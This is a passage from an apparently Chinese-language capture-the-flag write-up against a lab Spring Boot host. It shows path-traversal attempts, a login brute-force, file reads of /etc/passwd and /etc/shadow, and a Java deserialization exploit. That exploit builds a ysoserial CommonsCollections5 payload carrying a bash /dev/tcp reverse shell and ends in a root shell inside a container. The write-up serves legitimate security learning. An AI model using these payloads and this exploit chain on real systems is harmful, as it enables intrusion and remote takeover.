}\n</script>\n</body>\n</html>\n\n```\n\n\u5047\u7684\uff0c\u672c\u5730\u5b9e\u73b0\u7684\uff0c\u4e0d\u7136error\u53ef\u4ee5\u6d4b\u8bd5\u4e00\u4e0b{{7*7}}\u6a21\u677f\u6ce8\u5165\n\n\u7206\u7834\u4e00\u4e0b\u76ee\u5f55\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ curl http://192.168.205.131:8080/download                                                                                   \n{'timestamp':'2025-06-27T12:14:39.104+0000','status':400,'error':'Bad Request','message':'Required String parameter 'file' is not present','path':'/download'}                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ curl 'http://192.168.205.131:8080/download?file=../../../etc/passwd'\n<h1>Forbidden access                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ curl 'http://192.168.205.131:8080/download?file=....//....//....//etc/passwd'\n<h1>Forbidden access                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ curl 'http://192.168.205.131:8080/download?file=php://filter/read=convert.base64-encode/resource=../../../etc/passwd'\n<h1>Forbidden access                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ curl 'http://192.168.205.131:8080/download?file=download'                                                            \n<h1>Forbidden access                                                                                                                                             \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl 'http://192.168.205.131:8080/download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd'\n<h1>Forbidden access                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl 'http://192.168.205.131:8080/download?file=..%5c..%5c..%5cetc/passwd'\n<h1>Forbidden access                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl 'http://192.168.205.131:8080/download?file=a/../../../../etc/passwd'\n<h1>Forbidden access                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl 'http://192.168.205.131:8080/download?file=file:///etc/passwd'\n<h1>Forbidden access                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl 'http://192.168.205.131:8080/download?file=../../../../etc/passwd%00.jpg'\n<h1>Forbidden access                                                                                                                    \n```\n\n\u5e94\u8be5\u662f\u5c11\u53c2\u6570\uff0c\u6682\u65f6\u6401\u7f6e\n\n\u7ed5\u8fc7\u4e0d\u4e86\uff0c\u7ee7\u7eed\u770b\u5176\u4ed6\u7684\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ curl http://192.168.205.131:8080/error                                                                    \n{'timestamp':'2025-06-27T12:16:49.948+0000','status':999,'error':'None','message':'No message available'}                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ curl http://192.168.205.131:8080/login\n{'timestamp':'2025-06-27T12:16:58.321+0000','status':405,'error':'Method Not Allowed','message':'Request method 'GET' not supported','path':'/login'}                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ curl http://192.168.205.131:8080/login -X POST\n{'timestamp':'2025-06-27T12:17:20.707+0000','status':400,'error':'Bad Request','message':'Required String parameter 'username' is not present','path':'/login'}                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ curl http://192.168.205.131:8080/test/        \n    \\<h1>Website is under development.......                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ trans -b :zh 'Website is under development.......' 2>/dev/null\n\u7f51\u7ad9\u6b63\u5728\u5f00\u53d1\u4e2d.......\n```\n\ngobuster\u8dd1\u4e00\u4e0b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ gobuster dir -u http://192.168.205.131:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.205.131:8080\n[+] Method:                  GET\n[+] Threads:                 64\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              zip,php,txt,html\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/download             (Status: 400) [Size: 158]\n/login.html           (Status: 200) [Size: 2377]\n/login                (Status: 405) [Size: 149]\n/test                 (Status: 200) [Size: 39]\n/logout               (Status: 302) [Size: 0] [--> http://192.168.205.131:8080/login.html]\n/success              (Status: 200) [Size: 47]\n/error                (Status: 500) [Size: 105]\n```\n\n\u591a\u4e86\u4e00\u4e2alogout\u4f46\u662f\u662f\u8df3\u8f6c\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ curl http://192.168.205.131:8080/logout -v                       \n*   Trying 192.168.205.131:8080...\n* Connected to 192.168.205.131 (192.168.205.131) port 8080\n* using HTTP/1.x\n> GET /logout HTTP/1.1\n> Host: 192.168.205.131:8080\n> User-Agent: curl/8.14.1\n> Accept: */*\n> \n* Request completely sent off\n< HTTP/1.1 302 \n< Set-Cookie: auth=; Max-Age=0; Expires=Thu, 01-Jan-1970 00:00:10 GMT; Path=/; HttpOnly\n< Location: http://192.168.205.131:8080/login.html\n< Content-Length: 0\n< Date: Fri, 27 Jun 2025 12:27:05 GMT\n< \n* Connection #0 to host 192.168.205.131 left intact\n```\n\nnuclei\u626b\u63cf\u4e00\u4e0b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nuclei -u http://192.168.205.131:8080\nGenerated code\n__     _\nUse code with caution.\n____  __  / /  ()\n/ __ / / / / / / _ / /\n/ / / / // / // /  __/ /\n// //_,/_/_/_/_/   v3.4.5\nGenerated code\nprojectdiscovery.io\nUse code with caution.\n[INF] Your current nuclei-templates  are outdated. Latest is v10.2.3\n[INF] Successfully updated nuclei-templates (v10.2.3) to /home/kali/.local/nuclei-templates. GoodLuck!\nNuclei Templates v10.2.3 Changelog\n+-------+-------+----------+---------+\n| TOTAL | ADDED | MODIFIED | REMOVED |\n+-------+-------+----------+---------+\n| 11102 | 11102 |        0 |       0 |\n+-------+-------+----------+---------+\n[INF] Current nuclei version: v3.4.5 (latest)\n[INF] Current nuclei-templates version: v10.2.3 (latest)\n[WRN] Scan results upload to cloud is disabled.\n[INF] New templates added in latest release: 105\n[INF] Templates loaded for current scan: 8086\n[INF] Executing 7884 signed templates from projectdiscovery/nuclei-templates\n[WRN] Loading 202 unsigned templates for scan. Use with caution.\n[INF] Targets loaded for current scan: 1\n[INF] Templates clustered: 1747 (Reduced 1642 Requests)\n[INF] Using Interactsh Server: oast.online\n[ssh-auth-methods] [javascript] [info] 192.168.205.131:22 ['['publickey','password','keyboard-interactive']']\n[ssh-server-enumeration] [javascript] [info] 192.168.205.131:22 ['SSH-2.0-OpenSSH_9.9']\n[ssh-password-auth] [javascript] [info] 192.168.205.131:22\n[ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.131:22\n[spring-detect] [http] [info] http://192.168.205.131:8080/error\n[options-method] [http] [info] http://192.168.205.131:8080 ['GET,HEAD,OPTIONS']\n[springboot-actuator:favicon] [http] [info] http://192.168.205.131:8080/favicon.ico\n[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.205.131:8080/login.html\n[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.131:8080/login.html\n[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.131:8080/login.html\n[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.205.131:8080/login.html\n[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.205.131:8080/login.html\n[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.205.131:8080/login.html\n[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.205.131:8080/login.html\n[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.131:8080/login.html\n[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.205.131:8080/login.html\n[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.205.131:8080/login.html\n[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.205.131:8080/login.html\n[favicon-detect:spring-boot] [http] [info] http://192.168.205.131:8080/favicon.ico ['116323821']\n[favicon-detect:Springboot Actuators] [http] [info] http://192.168.205.131:8080/favicon.ico ['116323821']\n[favicon-detect:Spring Boot H2 Database] [http] [info] http://192.168.205.131:8080/favicon.ico ['116323821']\n[INF] Scan completed in 1m. 21 matches found.\n```\n\n\u770b\u5230Spring Boot\uff0c\u6240\u4ee5\u5c1d\u8bd5\u63a2\u6d4b\u4e86\u4e00\u4e0b\uff0c\u65e0\u679c\n\n\u90a3\u53bb\u7206\u7834login\u5427\n\n\u4e71\u8f93\uff0cburp\u62e6\u4e0a\uff0c\u653e\u53bb\u7206\u7834\u6a21\u5757\n\n![image-20250627203233278](https://7r1umphk.github.io/image/image20250627203233435.webp)\n\n\u7528\u6237\u540d\n\n\u5bc6\u7801\u6252\u62c9\u4e00\u4e2arockyou\n\n![image-20250627203358528](https://7r1umphk.github.io/image/image20250627203358895.webp\n\n\u767b\u5f55\n\n![image-20250627203459351](https://7r1umphk.github.io/image/image20250627203459633.webp)\n\n\u6e90\u7801\u6ca1\u5565\uff0c\u90a3\u5c31\u770b\u4e00\u4e0b\u5305\n\n```\nGET /success HTTP/1.1\nHost: 192.168.205.131:8080\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate, br\nReferer: http://192.168.205.131:8080/login.html?error=Wrong%20username%20or%20password\nConnection: keep-alive\nCookie: auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI=\nUpgrade-Insecure-Requests: 1\nPriority: u=0, i\n\n\n```\n\n\u6709\u4e2acookie\uff0c\u6211\u4eec\u521a\u521a\u90a3\u91cc\u4e5f\u5c11\u4e2a\u53c2\u6570so\n\n### 3.2 \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\uff08LFI\uff09\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ curl 'http://192.168.205.131:8080/download?file=../../../etc/passwd' -H 'Cookie:auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI='\nroot:x:0:0:root:/root:/bin/ash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/spool/mail:/sbin/nologin\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\noperator:x:11:0:operator:/root:/bin/sh\nman:x:13:15:man:/usr/man:/sbin/nologin\npostmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\nat:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin\nsquid:x:31:31:Squid:/var/cache/squid:/sbin/nologin\nxfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin\ngames:x:35:35:games:/usr/games:/sbin/nologin\npostgres:x:70:70::/var/lib/postgresql:/bin/sh\ncyrus:x:85:12::/usr/cyrus:/sbin/nologin\nvpopmail:x:89:89::/var/vpopmail:/sbin/nologin\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\nsmmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin\nguest:x:405:100:guest:/dev/null:/sbin/nologin\nnobody:x:65534:65534:nobody:/:/sbin/nologin\n```\n\n\u53ef\u4ee5\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\uff0c\u4f46\u662f\u53d1\u73b0\u597d\u50cf\u6ca1\u51e0\u4e2a\u7528\u6237\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ curl 'http://192.168.205.131:8080/download?file=../../../etc/shadow' -H 'Cookie:auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI='\nroot:!::0:::::\nbin:!::0:::::\ndaemon:!::0:::::\nadm:!::0:::::\nlp:!::0:::::\nsync:!::0:::::\nshutdown:!::0:::::\nhalt:!::0:::::\nmail:!::0:::::\nnews:!::0:::::\nuucp:!::0:::::\noperator:!::0:::::\nman:!::0:::::\npostmaster:!::0:::::\ncron:!::0:::::\nftp:!::0:::::\nsshd:!::0:::::\nat:!::0:::::\nsquid:!::0:::::\nxfs:!::0:::::\ngames:!::0:::::\npostgres:!::0:::::\ncyrus:!::0:::::\nvpopmail:!::0:::::\nntp:!::0:::::\nsmmsp:!::0:::::\nguest:!::0:::::\nnobody:!::0:::::\n                                    \n```\n\n\u770b\u5230\u8fd9\u5c31\u6709\u70b9\u6000\u7591\u662fdocker\u4e86\n\n\u56e0\u4e3a\u524d\u9762nuclei\u626b\u63cf\u7684\u65f6\u5019\u770b\u5230\u53ef\u80fd\u662fspringboot\uff0c\u6240\u4ee5\u5173\u6ce8\u4e00\u4e0bJava\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ curl 'http://192.168.205.131:8080/download?file=../../../../proc/self/cmdline' -H 'Cookie: auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI=' -o cmdline\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100    40    0    40    0     0   8188      0 --:--:-- --:--:-- --:--:-- 10000\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ cat cmdline                                                                 \njava-jarjavaserver-0.0.1-SNAPSHOT.jar                                           \n```\n\n\u5047\u8bbe\u8def\u5f84\u662fapp/java-jarjavaserver-0.0.1-SNAPSHOT.jar\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ curl 'http://192.168.205.131:8080/download?file=../../../../app/java-jarjavaserver-0.0.1-SNAPSHOT.jar' -H 'Cookie: auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI='\n../../../../app/java-jarjavaserver-0.0.1-SNAPSHOT.jar                          \n```\n\n\u554a\u8fd9\uff0c\u90a3\u6211\u4e0d\u731c\u4e86\n\nLinux \u7684 /proc \u6587\u4ef6\uff0c\u53ef\u4ee5\u67e5\u770b**\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55**\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ curl 'http://192.168.205.131:8080/download?file=../../../../proc/self/cwd' -H 'Cookie: auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI='\n../../../../proc/self/cwd                                                       \n```\n\n\u554a\u8fd9\uff0c\u90a3\u7ee7\u7eed\u731c\u5427\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ curl 'http://192.168.205.131:8080/download?file=javaserver-0.0.1-SNAPSHOT.jar' -H 'Cookie: auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI=' -o app.jar && ls -l app.jar\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100 16.5M    0 16.5M    0     0  12.9M      0 --:--:--  0:00:01 --:--:-- 12.9M\n-rwxr-xr-x 1 kali kali 17372545  6\u670827\u65e5 08:51 app.jar\n                                                       \n```\n\n\uff08\u8981\u4e0d\u53bb\u4e70\u4e2a\u5f69\u7968\uff0c\u54c8\u54c8\u54c8\uff09\n\n### 3.3 Java\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5229\u7528\n\n\u62ffjd-gui\u770b\u770b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ jd-gui app.jar\n\n```\n\n![image-20250627205341588](https://7r1umphk.github.io/image/image20250627205341941.webp)\n\n\u6ca1\u4e1c\u897f\uff0c\u4f46\u662f**VulnController.class**\n\n```\n// ...\nimport java.io.ObjectInputStream;\nimport java.io.ByteArrayInputStream;\n// ...\n\n@PostMapping({'/deserialize'})\npublic String deserialize(@RequestBody byte[] data, HttpServletRequest request) {\n    if (!isLoggedIn(request)) // \u68c0\u67e5\u662f\u5426\u5df2\u767b\u5f55\n        return '<h2>Error: Unauthorized access';\n    try {\n        // \u5371\u9669\u64cd\u4f5c\uff1a\u76f4\u63a5\u4ece\u8bf7\u6c42\u4f53\u4e2d\u8bfb\u53d6\u6570\u636e\u5e76\u53cd\u5e8f\u5217\u5316\n        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));\n        Object obj = ois.readObject();\n        ois.close();\n        return 'Deserialized: ' + obj.toString();\n    } catch (Exception e) {\n        return 'Error: ' + e.getMessage();\n    }\n}\n```\n\n\u770b\u4ed6\u7684\u5904\u7406\u65b9\u6cd5......\u6709\u70b9\u50cf\u6253**\u53cd\u5e8f\u5217\u5316**\n\n> Java\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\n>\n> \u5e94\u7528\u63a5\u6536\u4e86\u6765\u81ea\u7528\u6237\u7684\u5e8f\u5217\u5316\u6570\u636e\uff0c\u5e76\u5728\u6ca1\u6709\u8fdb\u884c\u5b89\u5168\u68c0\u67e5\u7684\u60c5\u51b5\u4e0b\u8c03\u7528 `ObjectInputStream.readObject()` \u5c06\u5176\u8fd8\u539f\u4e3aJava\u5bf9\u8c61\u3002\u5982\u679c\u5e94\u7528\u7684classpath\u4e2d\u5b58\u5728\u67d0\u4e9b\u88ab\u79f0\u4e3a\u201cgadget\u201d\u7684\u7279\u6b8a\u7c7b\uff0c\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u6784\u9020\u6076\u610f\u7684\u5e8f\u5217\u5316\u6570\u636e\u3002\u5f53\u8fd9\u4e9b\u6570\u636e\u88ab\u53cd\u5e8f\u5217\u5316\u65f6\uff0c\u4f1a\u89e6\u53d1gadget\u7c7b\u4e2d\u7684\u65b9\u6cd5\uff0c\u6700\u7ec8\u5bfc\u81f4\u4efb\u610f\u4ee3\u7801\u6267\u884c\uff08RCE\uff09\u3002\n\n![image-20250627205623427](https://7r1umphk.github.io/image/image20250627205623599.webp)\n\nok\uff0c\u6ca1\u4e8b\u4e86\uff0c\u5c31\u662f\u6253\u53cd\u5e8f\u5217\u5316\n\ncommons-collections-3.2.1.jar\u8fd9\u4e2a\u5e93\uff0c\u5982\u679c\u4e86\u89e3\u7684\u8bdd\uff0c\u5c31\u77e5\u9053\u53ef\u4ee5\u88ab ysoserial \u5de5\u5177\u5229\u7528\n\nurl:/deserialize\n\n\u8bf7\u6c42\u65b9\u6cd5\uff1aPOST\n\nif (!isLoggedIn(request)) \u5fc5\u987b\u643a\u5e26\u6709\u6548\u7684 Cookie\n\nnew ObjectInputStream(new ByteArrayInputStream(data));\u548c ois.readObject();\u6253\u5f00\u623f\u95e8\u8ba9\u4f60\u8fdb\uff0c\u4e0d\u505a\u4efb\u4f55\u68c0\u67e5\uff0c\u975e\u5e38\u7684\u6559\u79d1\u4e66\n\n\u90a3\u62ff\u4e00\u4e0b\u5427\n\nKali\u76d1\u542c\u4e00\u4e0b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nc -lvnp 8888\nlistening on [any] 8888 ...\n```\n\n\u4f7f\u7528 ysoserial\u751f\u6210\u53cd\u5f39 Shell payload\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar \n--2025-06-27 20:21:29--  https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar\n\u6b63\u5728\u89e3\u6790\u4e3b\u673a github.com (github.com)... 224.0.0.1\n\u6b63\u5728\u8fde\u63a5 github.com (github.com)|224.0.0.1|:443... \u5df2\u8fde\u63a5\u3002\n\u5df2\u53d1\u51fa HTTP \u8bf7\u6c42\uff0c\u6b63\u5728\u7b49\u5f85\u56de\u5e94... 302 Found\n\u4f4d\u7f6e\uff1ahttps://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar [\u8ddf\u968f\u81f3\u65b0\u7684 URL]\n--2025-06-27 20:21:32--  https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar\n\u518d\u6b21\u4f7f\u7528\u5b58\u5728\u7684\u5230 github.com:443 \u7684\u8fde\u63a5\u3002\n\u5df2\u53d1\u51fa HTTP \u8bf7\u6c42\uff0c\u6b63\u5728\u7b49\u5f85\u56de\u5e94... 302 Found\n\u4f4d\u7f6e\uff1ahttps://objects.githubusercontent.com/github-production-release-asset-2e65be/29955458/bb6518d9-ffb7-4437-8b6f-db3659467c5c?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250628%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250628T002132Z&X-Amz-Expires=1800&X-Amz-Signature=6f7e3edd576cb88052588bac5ba19eef49326f73e6dbe5802b878c1f9e6ec3f3&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dysoserial-all.jar&response-content-type=application%2Foctet-stream [\u8ddf\u968f\u81f3\u65b0\u7684 URL]\n--2025-06-27 20:21:32--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/29955458/bb6518d9-ffb7-4437-8b6f-db3659467c5c?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250628%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250628T002132Z&X-Amz-Expires=1800&X-Amz-Signature=6f7e3edd576cb88052588bac5ba19eef49326f73e6dbe5802b878c1f9e6ec3f3&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dysoserial-all.jar&response-content-type=application%2Foctet-stream\n\u6b63\u5728\u89e3\u6790\u4e3b\u673a objects.githubusercontent.com (objects.githubusercontent.com)... 224.0.0.2\n\u6b63\u5728\u8fde\u63a5 objects.githubusercontent.com (objects.githubusercontent.com)|224.0.0.2|:443... \u5df2\u8fde\u63a5\u3002\n\u5df2\u53d1\u51fa HTTP \u8bf7\u6c42\uff0c\u6b63\u5728\u7b49\u5f85\u56de\u5e94... 200 OK\n\u957f\u5ea6\uff1a59525376 (57M) [application/octet-stream]\n\u6b63\u5728\u4fdd\u5b58\u81f3: \u201cysoserial-all.jar\u201d\n\nysoserial-all.jar                            100%[============================================================================================>]  56.77M  17.2MB/s  \u7528\u65f6 3.9s    \n\n2025-06-27 20:21:39 (14.6 MB/s) - \u5df2\u4fdd\u5b58 \u201cysoserial-all.jar\u201d [59525376/59525376])\n\n                                                               \n```\n\n\u751f\u6210 payload\uff08\u53ef\u80fd\u4f60\u7684java\u4f1a\u6709\u95ee\u9898\uff0c\u53bb\u4e0b\u8f7d\u4e00\u4e2aJava 8\u7248\u672c\u7684\u5c31\u597d\u4e86\uff09\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ echo -n 'bash -i >& /dev/tcp/192.168.205.128/8888 0>&1' | base64\nYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwNS4xMjgvODg4OCAwPiYx\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ java -jar ysoserial-all.jar CommonsCollections5 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwNS4xMjgvODg4OCAwPiYx}|{base64,-d}|{bash,-i}' > payload.bin\n```\n\n\u5c1d\u8bd5\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl 'http://192.168.205.131:8080/deserialize' -X POST --cookie 'auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI=' --data-binary @payload.bin                   \n{'timestamp':'2025-06-27T13:34:01.451+0000','status':404,'error':'Not Found','message':'No message available','path':'/deserialize'}                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl 'http://192.168.205.131:8080/deserialize' -X POST --cookie 'auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI=' --data-binary @payload.bin -H 'Content-Type:'\n{'timestamp':'2025-06-27T13:34:11.493+0000','status':404,'error':'Not Found','message':'No message available','path':'/deserialize'}                   \n```\n\n\u5f39\u56de\u6765\u4e86\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nc -lvnp 8888\nlistening on [any] 8888 ...\nconnect to [192.168.205.128] from (UNKNOWN) [192.168.205.131] 45266\nbash: cannot set terminal process group (1): Not a tty\nbash: no job control in this shell\nbash-4.4# id\nid\nuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\n```\n\n## \u56db\u3001\u6a2a\u5411\u79fb\u52a8\uff1aDocker\u9003\u9038\u4e0e\u5185\u7f51\u7a7f\u900f\n\n\u7784\u4e86\u4e00\u4e0b\uff0c\u5e76\u4e14\u6839\u636e\u4e4b\u524d\u4e0b\u8f7d\u9776\u673a\u7684\u4f53\u91cf\u63a8\u6d4b\u662f\u4e2aalpine\uff0c\u6240\u4ee5\u4e0d\u7a33\u5b9ashell\u4e86\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nc -lvnp 8888\nlistening on [any] 8888 ...\nconnect to [192.168.205.128] from (UNKNOWN) [192.168.205.131] 45266\nbash: cannot set terminal process group (1): Not a tty\nbash: no job control in this shell\nbash-4.4# id\nid\nuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\nbash-4.4# ls -la\nls -la\ntotal 16976\ndrwxr-xr-x    1 root     root          4096 Jun 16 18:16 .\ndrwxr-xr-x    1 root     root          4096 Jun 24 04:20 ..\n-rw-r--r--    1 root     root      17372545 Jun 16 17:46 javaserver-0.0.1-SNAPSHOT.jar\nbash-4.4# cd ..\ncd ..\nbash-4.4# ls -al\nls -al\ntotal 80\ndrwxr-xr-x    1 root     root          4096 Jun 24 04:20 .\ndrwxr-xr-x    1 root     root          4096 Jun 24 04:20 ..\n-rwxr-xr-x    1 root     root             0 Jun 24 04:20 .dockerenv\ndrwxr-xr-x    1 root     root          4096 Jun 16 18:16 app\ndrwxr-xr-x    1 root     root          4096 Jun 16 12:53 bin\ndrwxr-xr-x    5 root     root           320 Jun 27 08:43 dev\ndrwxr-xr-x    1 root     root          4096 Jun 24 04:20 etc\ndrwxr-xr-x    2 root     root          4096 May  9  2019 home\ndrwxr-xr-x    1 root     root          4096 Jun 16 12:53 lib\ndrwxr-xr-x    5 root     root          4096 May  9  2019 media\ndrwxr-xr-x    2 root     root          4096 May  9  2019 mnt\ndrwxr-xr-x    2 root     root          4096 May  9  2019 opt\ndr-xr-xr-x  217 root     root             0 Jun 27 08:43 proc\ndrwx------    1 root     root          4096 Jun 27 13:28 root\ndrwxr-xr-x    2 root     root          4096 May  9  2019 run\ndrwxr-xr-x    1 root     root          4096 Jun 16 12:53 sbin\ndrwxr-xr-x    2 root     root          4096 May  9  2019 srv\ndr-xr-xr-x   13 root     root             0 Jun 27 08:43 sys\ndrwxrwxrwt    1 root     root          4096 Jun 27 13:31 tmp\ndrwxr-xr-x    1 root     root          4096 May 11  2019 usr\ndrwxr-xr-x    